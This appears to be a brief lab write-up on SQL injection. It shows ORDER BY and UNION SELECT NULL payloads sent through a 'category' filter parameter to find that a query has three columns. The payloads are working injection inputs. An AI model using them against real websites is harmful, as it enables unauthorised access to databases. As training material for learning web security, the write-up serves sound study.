1. First way:
```
/filter?category=Gifts' ORDER BY 1--
/filter?category=Gifts' ORDER BY 2--
/filter?category=Gifts' ORDER BY 3--
/filter?category=Gifts' ORDER BY 4--
```

- We received an internal server error with **ORDER BY 4--** query. Therefore, the number of columns is 3.

2. Second way:
```
/filter?category=Gift' UNION SELECT NULL-- 
/filter?category=Gift' UNION SELECT NULL,NULL--
/filter?category=Gift' UNION SELECT NULL,NULL,NULL--
```

We always get error until the third query. Therefore, the number of column is 3.